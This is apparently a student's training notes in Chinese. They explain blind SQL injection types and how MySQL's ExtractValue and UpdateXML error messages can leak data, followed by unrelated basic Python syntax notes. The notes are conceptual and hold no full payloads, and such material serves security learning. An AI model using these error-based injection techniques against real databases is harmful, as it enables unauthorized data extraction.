（1）盲注

web方向的培训讲到sql的盲注部分。盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。sql注入绝大多数都是盲注了，是一个蛮重要的知识点，分为布尔盲注，时间（延时）盲注，报错盲注三大类。第一在于逻辑的判断，往往有两种回显页面显示对错，借助布尔型来一一剖解注入；第二则是通过时间函数sleep实现是否延时跳转来判断注入；第三是通过报错函数注入显示数据库等名字，比较善良的一种注入方式。

具体讲一下extractvalue、updatexml函数。

一、extractvalue函数

ExtractValue(xml_frag, xpath_expr)

第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径

例如：SELECT ExtractValue('<a><b><b/></a>', '/a/b'); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。

二、updatexml函数

UpdateXML(xml_target, xpath_expr, new_xml)

xml_target:： 需要操作的xml片段

xpath_expr： 需要更新的xml路径(Xpath格式)

new_xml： 更新后的内容

当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：xpath

python

每一行都是一个语句，当语句以冒号:结尾时，缩进的语句视为代码块。

缩进有利有弊。好处是强迫你写出格式化的代码，但没有规定缩进是几个空格还是Tab。按照约定俗成的惯例，应该始终坚持使用4个空格的缩进。然后代码块要能运行，缩进就必须匹配！

注意，Python程序是大小写敏感的，如果写错了大小写，程序会报错。

在Python中，定义一个函数要使用def语句，依次写出函数名、括号、括号中的参数和冒号:，然后，在缩进块中编写函数体，函数的返回值用return语句返回。
